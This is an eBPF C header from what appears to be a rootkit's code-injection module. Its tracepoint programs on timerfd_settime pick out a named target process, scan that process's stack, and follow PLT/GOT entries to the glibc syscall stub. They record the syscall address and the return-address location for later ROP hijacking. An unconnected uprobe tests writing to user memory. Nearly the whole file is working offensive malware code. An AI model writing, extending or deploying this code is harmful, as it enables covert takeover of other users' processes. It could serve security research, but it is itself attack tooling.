#ifndef __BPF_INJECTION_H
#define __BPF_INJECTION_H


#include "headervmlinux.h"

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "../../../common/constants.h"
#include "defs.h"

#define OPCODE_JUMP_BYTE_0 0xe8
#define OPCODES_SYSCALL_CALL 0

struct sys_timerfd_settime_enter_ctx {
    unsigned long long unused; //Pointer to pt_regs
    int __syscall_nr;
    unsigned int padding; //Alignment
    int ufd;
    int flags;
    const struct __kernel_itimerspec *utmr;
    struct __kernel_itimerspec *otmr;
};

struct sys_timerfd_settime_exit_ctx {
    unsigned long long unused; //Pointer to pt_regs
    int __syscall_nr;
    unsigned int padding; //Alignment
    long ret;
};

/**
 * @brief Checks whether the format of the syscall is the expected one
 * 
 * @param opcodes 
 * @param size 
 * @return 0 if correct, 1 otherwise
 */
static __always_inline int check_syscall_opcodes(__u8* opcodes){
    return 0 == (/*opcodes[0]==0xf3     //FOR GDB WORKING
        &&*/ opcodes[1]==0x0f
        && opcodes[2]==0x1e
        && opcodes[3]==0xfa
        && opcodes[4]==0x49
        && opcodes[5]==0x89
        && opcodes[6]==0xca
        && opcodes[7]==0xb8
        && opcodes[8]==0x1e
        && opcodes[9]==0x01
        && opcodes[10]==0x00
        && opcodes[11]==0x00
        && opcodes[12]==0x0f
        && opcodes[13]==0x05);

}   

static __always_inline int stack_extract_return_address_plt(__u64 stack){
    //We now have a possible call instruction, we check if it starts with the correct format
    __u8 *op = (__u8*)(stack - 0x5);
    __u8 opcode_arr[5];
    bpf_probe_read(&opcode_arr, 5*sizeof(__u8), op);
    if (opcode_arr[0] != OPCODE_JUMP_BYTE_0) {
        //bpf_printk(" -- Failed OPCODE: %x\n", opcode_arr[0]);
        return -1;
    }
    
    //We have localized the call instruction. We proceed to get the offset of the call.
    __u32 offset;
    if(bpf_probe_read_user(&offset, sizeof(__u32), &op[1])<0){
        bpf_printk("Failed to read op[1]\n");
        return -1;
    }
    bpf_printk("OP[1]: %x\n", &op[1]);
    bpf_printk("OFFSET: %x\n", offset);
    bpf_printk("OFFSET8: %x\n", (__u8)offset);
    bpf_printk("OP8: %x\n", (__u8*)op);
    __u32 sum = (uintptr_t)(op+offset+5);
    bpf_printk("SUM: %x\n", sum);
    
    __u8* call_addr = (__u8*)(__u64)sum;

    //We check which address was called. We could either be at libc already after
    //following it, or in the PLT entry on the same executable as before.
    __u64 call_opcode;
    bpf_printk("CALL_ADDR: %lx\n", call_addr);
    int ret;
    if ((ret = bpf_probe_read_user(&call_opcode, sizeof(__u64), call_addr)) < 0){
        bpf_printk("Failed to read memory at %x, RET IS %i\n", call_addr, ret);
        //call_dest = *call_addr;
        //bpf_printk("DEST: %lx\n", call_dest);
        return -1;
    }
    bpf_printk("CALL_OPCODES: %lx\n", call_opcode);

    bpf_probe_read_user(&opcode_arr, 2*sizeof(__u8), call_addr);
    //bpf_printk("OPCODE0: %x\n", opcode_arr[0]);
    //bpf_printk("OPCODE1: %x\n", opcode_arr[1]);

    if(opcode_arr[0]==0xff && opcode_arr[1]==0x25){
        bpf_printk("Found PLT entry\n");
        //We analyze the offset of the jump specified ff 25 XX XX XX XX
        //The address to which the jump takes us should be the actual syscall setup
        __u32 j_offset;
        bpf_probe_read_user(&j_offset, sizeof(__u32), &call_addr[2]);
        //j_offset += 6;
        //We obtain the address of the jump by adding the offset + our current memory address + 6 bytes of the current instruction
        __u64* j_addr = (u64*)(call_addr + j_offset + 6);
        bpf_printk("JOFFSET: %x\n", j_offset);
        bpf_printk("JADDR: %lx\n", j_addr);
        //Now that we have the address of the jump, we proceed to get the instruction opcodes there
        //However it's a bit more complex since what we have is the address in the GOT section where
        //the linker will place the address inside the shared library where the function is located.
        //More info in the documentation.
        __u64 got_addr;
        if(j_addr==NULL){
            return -1;
        }
        bpf_probe_read_user(&got_addr, sizeof(__u64), j_addr);
        bpf_printk("GOT_ADDR: %lx\n",got_addr);
        //Now that we have the address placed in the GOT section we can finally go to the function in glibc
        //where the syscall resides. We read the opcodes and check that they are the ones expected
        __u8 s_opcode[14];
        bpf_probe_read_user(s_opcode, 14*sizeof(__u8), (void*)got_addr);
        for(int ii=0; ii<14; ii++){
            //bpf_printk("S_OPC %i: %x\n",ii,s_opcode[ii]);
        }
        if(check_syscall_opcodes(s_opcode)!=0){
            bpf_printk("Not the expected syscall\n");
            return -1;
        }
        
        //We got the expected syscall.
        //We put it in an internal map.
        __u64 pid_tgid = bpf_get_current_pid_tgid();
        if(pid_tgid<0){
            return -1;
        }
        struct inj_ret_address_data *inj_ret_addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
        if (inj_ret_addr != NULL ){
            //It means we have already performed this whole operation
            return -1;
        }

        bpf_printk("Final found libc syscall address: %lx\n", got_addr);
        struct inj_ret_address_data addr;
        addr.libc_syscall_address = (__u64)got_addr;
        addr.stack_ret_address = 0;
        bpf_map_update_elem(&inj_ret_address, &pid_tgid, &addr, BPF_ANY);
    }
    

    return 0;
}


SEC("tp/syscalls/sys_enter_timerfd_settime")
int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
    __u64 *scanner = (__u64*)ctx->otmr;
    int fd = ctx->ufd;

    char comm[TASK_COMM_LEN] = {0};
    int err = bpf_get_current_comm(comm, sizeof(comm));
    if(err<0){
        return -1;
    }

    char *task = TASK_COMM_NAME_ROP_TARGET;
    if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
        return 0;
    }
    bpf_printk("TASK: %s\n", comm);

    long timesecs;
    //bpf_probe_read_user(&timesecs, sizeof(long), &(new->it_interval.tv_sec));
    //bpf_printk("AG %ld\n",timesecs);
    __u64 address = 0;
    bpf_printk("Timer %i to scan at address %lx\n", fd, scanner);
    #pragma unroll
    for(__u64 ii=0; ii<100; ii++){
        bpf_probe_read(&address, sizeof(__u64), (void*)scanner - ii);
        //bpf_printk("stack: %lx\n", address);
        if(stack_extract_return_address_plt(address)==0){
            //We found the return address
            __u64 found_return_address = *scanner - ii;
            //We put it in an internal map.
            __u64 pid_tgid = bpf_get_current_pid_tgid();
            if(pid_tgid<0){
                return -1;
            }
            struct inj_ret_address_data *inj_ret_addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
            if (inj_ret_addr == NULL ){
                //It means we failed to insert into the map before
                return -1;
            }
            struct inj_ret_address_data addr = *inj_ret_addr;
            addr.stack_ret_address = (__u64)scanner - ii;
            if(bpf_map_update_elem(&inj_ret_address, &pid_tgid, &addr, BPF_EXIST)<0){
                bpf_printk("Failed to insert the return address in bpf map\n");
                return -1;
            }
            bpf_printk("Final found return address: %lx\n", addr.stack_ret_address);
            return 0;
        }
    }

    


    return 0;
}

SEC("tp/syscalls/sys_exit_timerfd_settime")
int sys_exit_timerfd_settime(struct sys_timerfd_settime_exit_ctx *ctx){
    char comm[TASK_COMM_LEN] = {0};
    int err = bpf_get_current_comm(comm, sizeof(comm));
    if(err<0){
        return -1;
    }
    char *task = TASK_COMM_NAME_ROP_TARGET;
    if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
        return 0;
    }
    
    //If we are here we may have the return address stored in the map.
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u32 pid = pid_tgid >> 32;
    struct inj_ret_address_data *inj_ret_addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
    if (inj_ret_addr == NULL){
        //We failed to identify the return address in the previous probe.
        return -1;
    }

    struct inj_ret_address_data addr = *inj_ret_addr;
    bpf_printk("PID: %u, SYSCALL_ADDR: %lx, STACK_RET_ADDR: %lx", pid, addr.libc_syscall_address, addr.stack_ret_address);


    return 0;
}





//NOT CURRENTLY CONNECTED
SEC("uprobe/execute_command")
int uprobe_execute_command(struct pt_regs *ctx){
    bpf_printk("UPROBE activated\n");
    bpf_printk("Ret is %lx", ctx->ip);

    char* buf = "A\0";
    long ret;
    if((ret = bpf_probe_write_user((void*)ctx->ip, buf,1))>=0){
        bpf_printk("Success writting? Should not have happened\n");
        return -1;
    }
    bpf_printk("ERROR writing: %li\n", ret); //EFAULT
    char dest_buf[2];
    if(ctx->ip-5 <=0){
        return -1;
    }
    if((ret = bpf_probe_read_user(dest_buf, 2, (void*)ctx->ip-5))<0){
        bpf_printk("Error reading instruction\n");
        return -1;
    }
    //bpf_printk("Stack: %x\n", dest_buf);

    return 0;
}

#endif